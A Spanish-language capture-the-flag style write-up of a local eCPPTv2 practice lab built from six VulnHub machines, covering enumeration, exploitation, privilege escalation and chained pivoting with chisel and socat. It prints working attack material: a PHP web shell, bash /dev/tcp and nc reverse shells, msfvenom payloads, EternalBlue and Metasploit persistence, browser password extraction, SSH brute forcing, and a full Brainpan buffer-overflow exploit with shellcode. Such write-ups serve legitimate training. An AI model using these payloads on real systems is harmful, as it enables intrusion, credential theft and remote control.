---

title: eCCPTv2 Demo LAB
date: 2023-08-03 07:03 +0800
categories: [Writeup]
tags: [LABs, vulnhub, eCPPTv2, Certs]
pin: true

---

Este writeup esta realizado a partir de un [video](https://www.youtube.com/watch?v=Q7UeWILja-g) de s4vitar que simula el examen de la eCPPTv2, todas las máquinas estan montadas en local con "Vmware", podemos descargarlas de la plataforma de CTFs [VulnHub](https://www.vulnhub.com/).  
En primer lugar vamos a descargar y configurar vmware  antes de ponernos con la explotación.

<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/eCPPTv2_IMAGE.png" alt="Demo eCPPTv2">
  <figcaption style="font-style: italic; font-size: smaller;">Mapa de red</figcaption>
</figure>

## Descarga de Máquinas
- [Aragog](https://download.vulnhub.com/harrypotter/Aragog-1.0.2.ova)
- [Nagini](https://download.vulnhub.com/harrypotter/Nagini.ova)
- [Fawkes](https://download.vulnhub.com/harrypotter/Fawkes.ova)
- [Dumbledore](https://files.rg-adguard.net/file/4b2db170-4965-3890-9419-2cdfc0088384)
- [Matrix](https://mega.nz/#!CiwBjRZB!EtKOQvDQjytMq3LkkMgrHDC9EYxEz8mqpOg5M2N1OOk)
- [Brainpan](https://download.vulnhub.com/brainpan/Brainpan.zip)

## <font color="#953734">Configuración Máquinas</font>
La mayoria de las máquinas de VulnHub vienen preparadas para VirtualBOX, nosotros usaremos Vmware y por ello tenemos que cambiar en algunas máquinas el nombre de las interfaces de red.
Para poder cambiar las interfaces al arrancar una máquina vamos a pulsar "e" para poder entrar en un menu de GRUB y cambiar la parte donde dice "ro quit" y remplazarlo con "rw init=/bin/bash", pulsar crtl+x  o f10 para reiniciar la máquina y arrancar con una bash como "root". 

- Necesitamos ir al archivo $/etc/network/interfaces$ y cambiar el contenido por el siguiente código:
```php
auto ens33
allow-hotplug ens33
iface ens33 inet dhcp
auto ens34
allow-hotplug ens34
iface ens34 inet dhcp
```

---
## <font color="#953734">Configuración Vmware</font>
En VMware tenemos que ir a "/edit/Virtual\_Network Manager"
- Tenemos que activar "change settings" y entonces podemos añadir redes con "add network".

<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/vmwareSubNets.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Configuración VMnet</figcaption>
</figure>

- Creamos las redes necesarias hasta quedar como en la siguiente imagen.

<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/VMnet_lab.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">SubNet</figcaption>
</figure>

## <font color="#953734">Network</font>
Esta tabla indica el nombre de la máquina y cuantas interfaces tenemos que asignar a cada una

| <font color="#fbd5b5">Máquina</font>       | <font color="#fbd5b5">1ª Interface </font>        | <font color="#fbd5b5">2ª Interface</font>         |
| Aragog         | 192.168.50.230   | 10.10.0.129           |
| Nagini           | 10.10.0.130          | 192.168.100.131   |
| Fawkes         | 192.168.100.132 |                               |
| Dumbledore | 192.168.100.138 | 172.18.0.136          | 
| Matrix           | 172.18.0.133       | 10.15.12.130           |
| Brainpan       | 10.15.12.129        |                               |

## <font color="#953734">Explotación</font>
### <font color="#de7802">Aragog</font>
#### <font color="#fac08f">Enumeración</font>
- Puerto 22 
- Puerto 80
	- Gobuster /blog
	- Virtual host -> Overing ->  http://wordpress.aragog.hogwarts
	- Wappalizer -> Wordpress 5.0.12
	- Wordpress enumeración ->`sudo wpscan --api-token [TOKEN] --url http://wordpress.aragog.hogwarts/blog --enumerate` -> File manager pluggin vulnerable
#### <font color="#fac08f">Intrusion</font>
- searchsploit wp-file-manager -> php/webapps/51224.py
- `python3 51224.py [Command]` -> RevShell

##### <font color="#0070c0">www-data</font>
- `cat /etc/wordpress/config-default.php` -> credentials db root:mySecr3tPass
- Conection mysql:
	```mysql
	$> show databases;
	$> use wordpress;
	$> select * from wp_users;
	```
- Encontramos credentials hangrid98:\$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. ->  . `john --format=phpass --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash` -> hagrid98:password123

##### <font color="#0070c0">Hagrid98</font>
- Encontramos un archivo en /opt/.backup y con pspy vemos que este archivo lo ejecuta root y tenemos permisos de escritura.
- `chmod u+s /bin/bash` -> bash -p

##### <font color="#0070c0">Root</font>
- Crear "authorized\_keys" con nuestro .pub para crear futuras conexiones.
- Pwned!

#### <font color="#fac08f"><u>Pivoting</u> Aragog</font>
Copiamos en primer lugar chisel y socat con :
```python 
$> scp -i ~/ssh/ecpptv2 chisel root@192.168.50.230:/root/ # Copia chisel
$> scp -i ~/ssh/ecpptv2 socat root@192.168.50.230:/root/ # Copia socat
```
Levantamos server chisel

```python 
$> sudo ./chisel server --reverse -p 1234 # Kali: Creamos SERVER CHISEL
$> ./chisel client 192.168.50.221:1234 R:socks R:443:10.10.0.128:443/udp # VICTIMA: Nos conectamos a la ip y port del "sever_Chisel", y despues nos mandamos el port 80 del HOST que no alzancamos "10.10.0.128" a nuestro 80.
$> IMPORTANTE: modificar el fichero /etc/proxychains.conf -> "strict_chains" & "socks5 127.0.0.1 1080" 
```

### <font color="#de7802">Nagini</font>
#### <font color="#fac08f">Enumeración</font>

-  <u>Enumeración de hosts y Ports desde Aragog:</u>
	- Subimos [NetScan](https://raw.githubusercontent.com/r4mnx/Tools/main/NetScan/NetScan.sh) en Aragog para realizar un scaneo de hosts y ports
	- Nagini -> 10.10.0.128 -> Puertos 22 y 80 abiertos
	- Browser -> con foxy  proxy podemos configurar un nuevo proxy socks5 127.0.0.1 1080, y bajo este proxy podemos ver la WEB desde nuestra máquina de atacante
- Puerto 22
- Puerto 80
	- Realizamos un escaneo de directorio a la web `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.10.0.128' -t 20 -x html,php,txt --proxy socks5://127.0.0.1:1080` -> /note.txt 
	- http://10.10.0.128/note.txt -> vitual host:  https://quic.nagini.hogwarts y es http3 -> Preparamos el cliente de chisel par cambiar el pueto 80 por el 443 y descargamos esta [Tool](https://github.com/cloudflare/quiche)para interpretar http3.
	- Al instalar la quiche necesitamos desinstalar rustc y volver a instalarlo desde este [repo](https://github.com/rust-lang/rust)
	- Encontramos `/internalResourceFeTcher.php` 
#### <font color="#fac08f">Intrusión</font>
 - En la ruta  `/internalResourceFeTcher.php`
	- Podemos leer archivos del sevidor `file:///etc/passwd` nada interesante.
	- Escaneamos el joomla y encontramos un .bak el cual contiene unas credenciales de "mysql", goblin:ILhwP6HTYKcN7qMh. 
	- Se nos ocurre usar "gopherus" para poder extraer información de la mysql.
	- USE joomla; SHOW TABLES; # Listamos tablas
	- USE joomla; SHOW COLUMNS FROM joomla\_users; # Listamos columnas
	- USE joomla; SHOW COLUMNS FROM joomla\_users; # Extraemos un hash de admin
	- Intentamos crakear con john sin exito.
	- Entonces se nos ocurre cambiar la contraseña con gopherus al admin.
	- Generamos una pass `echo -n "r4mnx123" | md5sum` y generamos una query
	- USE joomla; UPDATE joomla\_users SET password = 'cd8e33f59a088b0f6df2911a251bfabe' WHERE email= 'site\_admin@nagini.hogwarts';
	- En /joomla/adminitrator accedemos como "site\_admin:r4mnx123"
	- En la template "protostar" creamos un nuevo fichero shell.php con `<?php system($_GET['cmd']); ?>`
	- `http://10.10.0.128/joomla/templates/protostar/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.0.129/4545%200%3E%261%22` Ejecutamos esta rev shell pero tenemos que tener en cuenta que no tenemos conexión directa con Aragog. 
	- Necesitamos usar un redirecionamiento con socat  para hacerr un fork. `./socat TCP-LISTEN:4545,fork TCP:192.168.50.221:4546` en Aragog.
	- Envio RevShell:
```python
			$> nc -nlvp 4546 # Kali
			$> ./socat TCP-LISTEN:4545,fork TCP:192.168.50.221:4546 # Socat en Aragog, redirección del puerto 4545 de la revShell a nuestra ip por el puerto 4546
			$> http://10.10.0.128/joomla/templates/protostar/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.0.129/4545%200%3E%261%22
```

##### <font color="#245bdb">www-data</font>
Encontramos un fichero en /home/snape/.creds.txt con una pass en base64, supongo que será de snape. snape:Love@lilly -> ssh.

##### <font color="#245bdb">Snape</font>
Tenemos un binario SUID con permisos de hermoine, "su\_cp" es igual que el comando cp. 
Para pivotar a Hermoine vamos a crear en /tmp un "authorized\_keys" con nuestra .pub de kali. 
Nos conectamos con nuestra id\_rsa por ssh con user hermoine.

##### <font color="#245bdb">Hermoine</font>
Encontramos un directorio .mozilla, lo comprimimos y nos lo pasamos a nuestra máquina Kali.
Podemos usar [firefox\_decrypt](https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py) , esta herramienta hace un escaneo de todos los perfiles de firefox e intenta recopilar contraseñas guardadas. 

- `python3 firefox_decrypt.py .mozilla/firefox`
	- Extraemos root:@Alohomora#123

##### <font color="#245bdb">ROOT</font>
- Creamos un authorized\_keys con nuestro .pub de kali
- <font color="#e36c09">PWNED!</font>

#### <font color="#fac08f"><u>Pivoting</u> Nagini</font>

Ahora vamos a levantar un cliente de chisel en Nagini para poder ir enumerando la red, necesitamos un socat en Aragog para la redirección a nuestro server chisel en nuestro Kali y el cliente de chisel que apunte a Aragog.
```python 
$> ./socat TCP-LISTEN:1000,fork TCP:192.168.50.221:1234 # Socat en Aragog
$> ./chisel client 10.10.0.129:1000 R:8888:socks

# Ahora necesitamos cambiar el fichero /etc/proxychains.conf, tenemos que cambiar de stric_chain a dimamic_chain y agregar socks5 127.0.0.1 8888 encima de la linea del puerto 1080.
# El Strict_chain realiza las peticiones proxies de forma ordenada según estan configuradas en el archivo de configuración, mientras que dinamic_chain selecciona el proxy necesario para cada  accion, solo necesita estar decalarado en proxychains.conf.
```

### <font color="#de7802">Fawkes</font>
#### <font color="#fac08f">Enumeración</font>

- Con [NetScan](https://raw.githubusercontent.com/r4mnx/Tools/main/NetScan/NetScan.sh) realizo un escaneo desde Nagini y descubrimos una IP
- Lanzamos nmap con el siguiente comando para agilizarlo mediante hilos y bajo el proxy. `seq 1 65535 | xargs -P 500 -I {} proxychains4 nmap -sT -Pn -p{} --open -T5 -v -n 192.168.100.132 2>&1 | grep "tcp open"` 

- Puerto 21 -> Descarga del binario con Anonymous
- Puerto 22
- Puerto 80
- Puerto 2222
- Puerto 9898 -> Ejecución del Binario

#### <font color="#fac08f">Intrusión</font>

Descargamos el Binario por FTP
- `strace ./server_hogwarts` Levanta un servidor en el localhost por el puerto 9898
- `nc localhost 9898` Nos conectamos al puerto en nuestra máquina local.
- `proxychains4 nc 192.168.100.132 9898` Nos  conectamos directamente al binario de Fawkes

##### BoF 
Como tenemos el binario en local (descarga FTP) vamo a abrir el binario con gdb y conectarnos con "nc".
Si introducimos multiples "A" vemos un segmentation fault, esto nos indica  que no esta sanitizado el input del usuario y por lo tanto podemos llegar a controlar el flujo del programa sobreescribiendo partes de la memoria para poder injectar un comando.

La idea es ejecutar el binario con gdb e ir probando con `nc localhost 9898` , hacemos un script para que sea más comodo.
```python
$> gdb ./server_hogwarts
	$> run # Ejecutamos el binario
	$> checksec # Vemos protecciones en el binario activas
	$> pattern create 300 # Creamos una cadena de texto unica para identificar la longitud del input hasta llegar al EIP.
```

##### Contenedor
- sudo -l -> sudo /bin/sh -> root
- En la note.txt nos dice que analicemos el trafico 
- `tcmdump -i eth0 port ftp or ftp-data` -> pass neville:bL!Bsg3k
##### Neville
- find / -perm -4000 -ls 2\>/dev/null -> Binario sudo, version vulnerable  `searchsploit sudo 1.8.27`
- Usamos este [script](https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py) para hacer un bypass al sudo, solo necesitamos cambiar la ruta de donde esta nuestro binario de sudo, es decir en "/usr/local/bin/sudo".
##### <font color="#0070c0">ROOT</font>
- Crear authorized\_keys con nuestro .pub
- PWNED

#### <font color="#fac08f"><u>Pivoting</u> Fawkes</font> 

Esta máquina no necesita un cliente chisel, ya que sabemos que no tiene alcanze a otras redes, pero si tenemos que mandarnos la revShell cuando lanzamos el script al BoF en el puerto 9898.
```python
$> ./socat TCP-LISTEN:2323,fork TCP:10.10.0.129:2324 # NAGINI -> Escucha el puerto indicado en el ShellCode del BoF
$> ./socat TCP-LISTEN:2324,fork TCP:192.168.50.221:4545 # ARAGOG redirige el socat de la Nagiri al "nc" en nuestra máquina
$> nc -nlvp 4545 # KALI -> Recibe la revShell
```
### <font color="#de7802">Dumbledore</font>
#### <font color="#fac08f">Enumeración</font>
- Con [NetScan](https://raw.githubusercontent.com/r4mnx/Tools/main/NetScan/NetScan.sh) realizo un escaneo desde Nagini y descubrimos una IP
- Lanzamos nmap con el siguiente comando para agilizarlo mediante hilos y bajo el proxy. `seq 1 65535 | xargs -P 500 -I {} proxychains4 nmap -sT -Pn -p{} --open -T5 -v -n 192.168.100.130 2>&1 | grep "tcp open"` 
- Vamos a usar crackmapexec para ver a que Windows nos enfretamos:
	- `proxychains4 crackmapexec smb 192.168.100.130 2>/dev/null`
	- Es un windows 7 con smbv1

#### <font color="#fac08f">Intrusión</font>
- Version de smb vulnerable a enternalBlue. Con el recurso [AutoBlue](https://github.com/d4t4s3c/Win7Blue) ejecutamos el .sh y nos ponemos en escucha por el puerto 443 _`rlwrap nc -nlvp 4546`
- Ejecutamos `proxychains4 ./Win7blue.sh` y seguimos los pasos (Si no conseguimos la shell, ejecutarlo varias veces).
- Hay que tener en cuenta y crear con "socat" lo necesario para recibir la RevShell em muestro Kali. 
- He vuelto a montar socats similares a la RevShell de Fawkes.
```python
$> ./socat TCP-LISTEN:2323,fork TCP:10.10.0.129:2324 # NAGINI -> Escucha el puerto indicado en el ShellCode del BoF
$> ./socat TCP-LISTEN:2324,fork TCP:192.168.50.221:4545 # ARAGOG redirige el socat de la Nagiri al "nc" en nuestra máquina
$> nc -nlvp 4545 # KALI -> Recibe la revShell
```
##### Metasploit
Lo he probado también con metasploit  con "exploit/windows/smb/ms17_010_eternalblue" puedes ganar acceso y también crear persistencia por si perdemos la shell.
Persistencia -> "exploit/windows/local/persistence_service".
```python
msf6 > use exploit/windows/smb/ms17_010_eternalblue
	msf6 > set RHOSTS 192.168.100.130
	msf6 > set PROXIES socks5:127.0.0.1:8888 # Proxy 
	msf6 > set REVERSEALLOWPROXY true # Necesario para la revShell
	msf6 > exploit # PWNED!
```
##### <font color="#0070c0">ROOT</font>

- Ahora tenemos que subir nc64.exe y chisel.exe, para ello vamos a crear un recurso con smbserver.
```python 
$> sudo python3 smbserver.py smbfolder $(pwd) -smb2support # KALI
$> ./socat TCP-LISTEN:445,fork TCP:10.10.0.128:445 # NAGINI
$> ./socat TCP-LISTEN:445,fork TCP:192.168.50.202:445 # ARAGOG
$> dir net view \\192.168.100.131\smbfolder # Dumbledore lista recursos.
$> copy \\192.168.100.128\smbfolder\nc64.exe C:\\Windows\nc64.exe # Copiamos nc en Dumbledore
```
- Si necesitamos lanzarnos otra shell
```python
$> start "" /B nc64.exe 192.168.100.131 1002 -e cmd # Dumbledore
# Crear socat en ARAGOG y NAGINI
$> rlwrap nc -nlvp 4546 # Kali
```
- Escaneo de hosts abiertos
```python
$> for /L %a in (1,1,254) do @start /b ping 172.18.0.%a -w 100 -n 2 >nul # Escanea el rango de hosts
$> arp -a # Podemos ver las direcciones de hosts que han sido resultas con el protocolo arp (anterior comando).
```
#### <font color="#fac08f"><u>Pivoting</u> Dumbledore</font> 
- Montamos el cliente de chisel.exe
```python
$> ./socat TCP-LISTEN:2000,fork TCP:192.168.50.221:1234 # ARAGOG
$> ./socat TCP-LISTEN:2001,fork TCP:10.10.0.129:2000 # NAGINI
$> .\chisel.exe client 192.168.100.131:2001 R:9999:socks # Dumbledore
```
### <font color="#de7802">Matrix</font>
#### <font color="#fac08f">Enumeración</font>
- Enumeramos los puertos abiertos de Matrix 172.18.0.133.
```python 
$> seq 1 65535 | xargs -P 500 -I {} proxychains4 nmap -sT -Pn -p{} --open -T5 -v -n 172.18.0.{} 2>&1 | grep "tcp open" # Escaneo de puertos
```
<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/scanNmap.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Nmap con proxychains4</figcaption>
</figure>

#### <font color="#fac08f">Intrusión</font>
- Con la extensión "Foxy Proxy" en nuestro navegador configuramos otro proxy socks5 127.0.0.1 9999 para poder acceder a Matrix.
- Nos habla de que sigamos al Conejo Blanco
- En el codigo de la WEB vemos una ruta a una imagen p0rt_31337.png que es un conejo, vamos a ver que hay en ese puerto.
- Si volvermos a ver el codigo de este puerto vemos un codigo en base64.

<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/base64WEB.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Base64 Leaked</figcaption>
</figure>

-  El base64 nos indica un fichero Cypher.matrix y nos descarga un fichero.
- El fichero parece ser un tipo de cifrado, pego una linea en chatGPT y me indica que es un lenguje de programación esotérico llamado "[Brainfuck](https://sange.fi/esoteric/brainfuck/impl/interp/i.html)".  
<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/BrainFuckdecode.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Brainfuck</figcaption>
</figure>
- Nos habla de una pass pero tenemos que completarla con los ultimos dos carácteres. Nos ayudaremos de la herramienta "crunch" para crear un diccionario y con el user "guest" probaremos por fuerza bruta el ssh con hydra .
```python
$> crunch 8 8 -t k1ll0r%@ > DiccPass
$> crunch 8 8 -t k1ll0r@% > DiccPass
```
<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/hydraSSH.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Hydra con SSH</figcaption>
</figure>

##### <font color="#0070c0">Guest</font>
- Nos conectamos por ssh y entramos en una rbash (Restricted Bash), para poder ganar una bash sin restriciones, volvemos a conectarnos por ssh pero ahora le indicamos que ejecute una bash.
- `proxychains4 ssh guest@172.18.0.133 bash`
- Con "sudo -l" vemos que podemos ejecutar cualquier comando como root -> "sudo su" -> root.

##### <font color="#0070c0">ROOT</font>
- Creamos el "authorized_keys" con nuestro .pub.
- Copiamos los Binarios de Chisel y NetCat.
```python
$> proxychains4 scp -i ~/ssh/ecpptv2 NetScan.sh root@172.18.0.133:/root/
$> proxychains4 scp -i ~/ssh/ecpptv2 chisel root@172.18.0.133:/root/
$> proxychains4 scp -i ~/ssh/ecpptv2 socat root@172.18.0.133:/root/
```
- <font color="#e36c09">PWNED!</font>
#### <font color="#fac08f"><u>Pivoting</u> Matrix</font> 
- Creamos los socat para el cliente chisel en Matrix y poder alcanzar la red 10.15.12.0/24
```python 
$> ./chisel client 172.18.0.135:3003 R:7777:socks # Chisel en MATRIX
$> netsh interface portproxy add v4tov4 listenport=3003 listenaddress=0.0.0.0 connectport=3002 connectaddress=192.168.100.131 # Dumbledore
$> ./socat TCP-LISTEN:3002,fork TCP:10.10.0.129:3001 # NAGINI
$> ./socat TCP-LISTEN:3001,fork TCP:192.168.50.221:1234 # ARAGOG
```
### <font color="#de7802">Brainpan</font>
#### <font color="#fac08f">Enumeración</font>
- Descubrimos puerto 9999 y 10000.
<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/nmapMatrix.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Nmap con proxychains4</figcaption>
</figure>
- Mediante burp podemos realizar un escaneo mandando la petición al intruder y fuzzeando /$test$ con el directorio 2.3.medium. Se necesita cambiar en /opciones/network/conecctions:
<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/socks5BURP.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Proxy en Burpsuite</figcaption>
</figure>
- Fuzzeamos desde el intruder de BURP. Encontramos la ruta $/bin$ y este nos descarga un binario "brainpan.exe". 
- En el puerto 9999 corre al parecer un programa y suponemos que este binario descargado será el del puerto 9999.
#### <font color="#fac08f">Intrusión</font>
- Si ejecutamos el binario en local y nos conectamos con `nc localhost 9999` vemos que podemos interactuar con el programa, si probamos a introducir muchos caracteres, nos arroja un "Segmentation Fault", ya nos imaginamos que se acontece un BoF.
 - Para este paso nos creamos una máquina virtual "windows7 32bits" e instalar "[Immunity Debugger](https://www.immunityinc.com/products/debugger/)" y copiar "[mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py)" en "C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands" . 
 - Con Immunity Debugger hacemos "attach" al binario lo ejecutamos.
<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/RUNimmunity.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Attach binario</figcaption>
</figure>
 - Desde KALI `nc [IPwin7] 9999` entablamos conexion. Ahora si metemos muchas "A" vemos que crashea el biniario, estamos ante un BoF.

<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/brainpan.exe.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Run Brainpan</figcaption>
</figure>

 - Vamos a crear un script siguiendo los siguientes pasos:
	1. Indetificar "offsec" hasta el EIP
		- Cadena especial para identificar la longitud del "offsec"
		<figure style="text-align: center;">
 	 		<img src="/assets/img/commons/eCPPTv2/offsecpatter.png" alt="VMnet_lab">
  			<figcaption style="font-style: italic; font-size: smaller;">Pattern Create</figcaption>
		</figure>
	2. Ahora EIP vale 35724134, el siguiente comando identifica el valor de los caracteres del anterior comando enviado y calcula la longitud del "offsec".
		<figure style="text-align: center;">
			<img src="/assets/img/commons/eCPPTv2/offsecResult.png" alt="VMnet_lab">
			<figcaption style="font-style: italic; font-size: smaller;">Pattern Offset</figcaption>
		</figure>
	3. El Offsec es de 524 hasta llegar a sobreescribir el EIP. Ahora vamos a diseñar una cadena para enviar y ver que tenemos acotados los registros. Nos creamos con python3 este comando: `python3 -c 'print("A"*524 + "B"*4 + "C"*200)'` y lo enviamos.
		<figure style="text-align: center;">
			<img src="/assets/img/commons/eCPPTv2/pythonOffsec.png" alt="VMnet_lab">
			<figcaption style="font-style: italic; font-size: smaller;">Python Create</figcaption>
		</figure>
	4. "B" es igual a  42 en Hex ("man ascii" para más info), como podemos ver, el EIP vale 42424242 es decir BBBB. Si le damos click derecho en ESP y Follow in Dump, si hacemos scroll hacia arriba, Podemos ver las A hasta el EIP las B en el EIP y las C el resto. 
		<figure style="text-align: center;">
			<img src="/assets/img/commons/eCPPTv2/DUMPabc.png" alt="VMnet_lab">
			<figcaption style="font-style: italic; font-size: smaller;">Follow in Dump</figcaption>
		</figure>	
	5.  Ahora con "mona" en Immunity Debugger generamos un directorio de trabajo y generamos un bytearray (ShellCode) para identificar si existen Codes que den error en el Binario "BadChars". Esto será lo que remplace a las anteriores "C" y será el comando a injectar en el Binario.
```python
		$> !mona config -set workingfolder C:\Users\test\Desktop\Binary\%p # Seteamos el directorio de trabajo para mona
		$> !mona bytearray -cpb "\x00" # Generamos ShellCoce descartando "\x00"
```
	 6. Ya vamos a tener que generar un script.py para que nos sea más fácil enviar la data. El script completo estará más abajo. El Shell code lo pegamos y lo enviamos al Win7 del ImmunityDebugging.
		- Tenemos un nuevo valor de ESP lo copiamos para compararlo con el anterior bytearray.bin generado con mona. Si nos muestra algun "badchars" debemos volver a ejecutar el comando `!mona bytearray -cpb "\x00"` e incluir los badchars que nos indique, repetir el proceso si es necesario.
		<figure style="text-align: center;">
			<img src="/assets/img/commons/eCPPTv2/MonaCompare.png" alt="VMnet_lab">
			<figcaption style="font-style: italic; font-size: smaller;">Mona compare</figcaption>
		</figure>
		-  Vamos a generar el ShellCode con "msfvenom" para injectar el comando y recibir una RevShell, la shell se mandará a Matrix.
```python
		$> msfvenom -p windows/shell_reverse_tcp LHOST=10.15.12.130 LPORT=3000 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread # ShellCode para la revshell
```
	7. Con el "OffSec" y el "ShellCode" ya solo nos queda buscar el registro el "jmp ESP" para completar el script y lanzarlo contra "Brainpan". 
```python
		$> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
			$> jmp ESP
```
	8. Con Mona buscamos este "opcode" en el binario de brainpan.exe y veremos el valor del "jmp ESP".
		1. `!mona modules` -> Vemos si existen protecciones en el binario.
		2. `!mona find -s "\xFF\xE4" -m brainpan.exe` -> busca dirección del registro del jmp ESP.
	9. Necesitamos  dejar un espacio entre el EIP y el ShellCode, este espacio porque puede ser que el ShellCode empieze a ejecutarse y puede ser que no se interpreten los primeros bytes .Incluimos b"\\x90"*16". 
	10. Esta máquina parece que tiene una aplicación montada como Windows en algún entorno como "Wine" o algo pareceido pero realmente es un "Linux". Cuando accedemos con la RevShell, estamos en un disco lógico Z:.
	11. Vamos a preparar otro shellcode para linux y lanzar otra vez el script.py. Command: _`msfvenom -p linux/x86/shell_reverse_tcp LHOST=[NAGINI] LPORT=1346 -f py -b "\x00" EXITFUNC=thread`_  . Ganamos acceso como "Puck"

##### <font color="#0070c0">Puck</font>
- Hacemos un tratamiento de la tty.
```python
$> script /dev/null -c bash # Brainpan
	$> stty raw -echo; fg # kali
	$> reset xterm # kali
	$> export TERM=xterm # Brainpan
	$> export SHELL=bash # Brainpan
```
- Ejecutamos "sudo -l" y podemos lanzar un binario como sudo que permite algunas opciones, podemos leer un manual de alguna herramienta. 
```python
$> sudo /home/anansi/bin/anansi_util manual whoami
$> !/bin/bash # Dentro del modo paginate.
```
<figure style="text-align: center;">
  <img src="/assets/img/commons/eCPPTv2/RootBrainpan.png" alt="VMnet_lab">
  <figcaption style="font-style: italic; font-size: smaller;">Escalation Root</figcaption>
</figure>
- **PWNED!**
- **Script Python**

```python
#!/usr/bin/python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3) # jmp ESP

shellcode =  (b"\xdb\xc0\xbb\xc7\xd3\x83\x15\xd9\x74\x24\xf4\x5a"
b"\x31\xc9\xb1\x12\x31\x5a\x17\x03\x5a\x17\x83\x05"
b"\xd7\x61\xe0\xb8\x03\x92\xe8\xe9\xf0\x0e\x85\x0f"
b"\x7e\x51\xe9\x69\x4d\x12\x99\x2c\xfd\x2c\x53\x4e"
b"\xb4\x2b\x92\x26\x87\x64\x56\x6b\x6f\x77\x97\x96"
b"\x32\xfe\x76\x28\xd4\x50\x28\x1b\xaa\x52\x43\x7a"
b"\x01\xd4\x01\x14\xf4\xfa\xd6\x8c\x60\x2a\x36\x2e"
b"\x18\xbd\xab\xfc\x89\x34\xca\xb0\x25\x8a\x8d")

payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.50.73", 9999))
s.send(payload)
s.close()
```
#### <font color="#fac08f"><u>Pivoting</u>Brainpan</font> 
Socat para la Reverse Shell.
```python 
$> ./socat TCP-LISTEN:4004,fork TCP:172.18.0.135:4003 # MATRIX
$> netsh interface portproxy add v4tov4 listenport=4003 listenaddress=0.0.0.0 connectport=4002 connectaddress=192.168.100.131 # Dumbledore 
$> ./socat TCP-LISTEN:4002,fork TCP:10.10.0.129:4001 # NAGINI
$> ./socat TCP-LISTEN:4001,fork TCP:192.168.50.221:4000 # ARAGOG
```
